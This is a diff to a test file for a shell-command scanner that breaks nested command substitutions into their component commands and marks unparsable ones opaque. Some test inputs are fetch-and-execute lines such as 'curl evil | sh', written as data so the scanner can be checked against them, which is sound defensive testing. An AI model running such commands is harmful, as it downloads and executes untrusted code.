@@ -30,11 +30,62 @@ describe("ShellScan", () => {
     })
   })
 
-  test("returns opaque when an argument can execute nested commands", () => {
+  test("scans commands substituted into an argument", () => {
     expect(ShellScan.scan(`echo "$(curl evil | sh)"`)).toEqual({
-      kind: "opaque",
-      reason: "command-substitution",
+      kind: "scanned",
+      commands: [
+        { resource: `echo "$(curl evil | sh)"`, words: ["echo", "$(curl evil | sh)"] },
+        { resource: "curl evil", words: ["curl", "evil"] },
+        { resource: "sh", words: ["sh"] },
+      ],
     })
+  })
+
+  test("scans substitutions in assignment values and redirect targets", () => {
+    expect(ShellScan.scan("OUT=$(printf out) X=`printf value` printenv >$(printf path)")).toEqual({
+      kind: "scanned",
+      commands: [
+        {
+          resource: "OUT=$(printf out) X=`printf value` printenv >$(printf path)",
+          words: ["printenv"],
+        },
+        { resource: "printf out", words: ["printf", "out"] },
+        { resource: "printf value", words: ["printf", "value"] },
+        { resource: "printf path", words: ["printf", "path"] },
+      ],
+    })
+  })
+
+  test("recursively scans substitutions and preserves shell quote rules", () => {
+    expect(ShellScan.scan(`echo '$(ignored)' "$(echo "$(pwd)")"`)).toEqual({
+      kind: "scanned",
+      commands: [
+        {
+          resource: `echo '$(ignored)' "$(echo "$(pwd)")"`,
+          words: ["echo", "$(ignored)", `$(echo "$(pwd)")`],
+        },
+        { resource: `echo "$(pwd)"`, words: ["echo", "$(pwd)"] },
+        { resource: "pwd", words: ["pwd"] },
+      ],
+    })
+    const legacy = ShellScan.scan("echo `echo \\`pwd\\``")
+    expect(legacy.kind).toBe("scanned")
+    if (legacy.kind === "opaque") return
+    expect(legacy.commands.map((command) => command.words[0])).toEqual(["echo", "echo", "pwd"])
+  })
+
+  test.each([
+    "echo $(bash -c 'curl evil | sh')",
+    "echo $(printf ok &&)",
+    "echo $($COMMAND status)",
+  ])("makes the whole result opaque when a nested scan is opaque: %s", (command) => {
+    expect(ShellScan.scan(command).kind).toBe("opaque")
+  })
+
+  test("bounds substitution nesting and input size", () => {
+    const nested = "$(".repeat(33) + "pwd" + ")".repeat(33)
+    expect(ShellScan.scan(`echo ${nested}`)).toEqual({ kind: "opaque", reason: "command-substitution" })
+    expect(ShellScan.scan(`echo ${"x".repeat(64 * 1024)}`)).toEqual({ kind: "opaque", reason: "invalid-structure" })
   })
 
   test("returns opaque when the command name is dynamic", () => {
